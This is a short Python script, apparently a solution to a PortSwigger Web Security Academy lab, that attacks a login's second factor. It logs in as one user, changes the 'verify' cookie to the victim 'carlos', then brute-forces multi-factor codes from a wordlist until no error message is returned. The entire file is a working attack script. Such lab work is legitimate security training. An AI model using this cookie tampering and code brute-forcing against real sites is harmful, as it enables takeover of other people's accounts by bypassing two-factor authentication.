import requests
import re

wordlist = open("wordlist1.txt","r")

data = {'username': "wiener", 'password': "peter"}
respuesta1 = requests.post('https://0adc002f04e3267f815e073f00a1007f.web-security-academy.net/login', data=data, allow_redirects=False)
cookies = respuesta1.cookies
for cookie in cookies:
	if cookie.name == 'verify':
		cookie.value = 'carlos'

for i in wordlist:
	data1 = {"mfa-code":i.strip()}
	respuesta2 = requests.post("https://0adc002f04e3267f815e073f00a1007f.web-security-academy.net/login2", data=data1, cookies=cookies)
	coincidencia = re.findall("Incorrect security code",respuesta2.text)
	if coincidencia == []:
		print("El codigo de verificacion de Carlos es:"+i)
		quit()
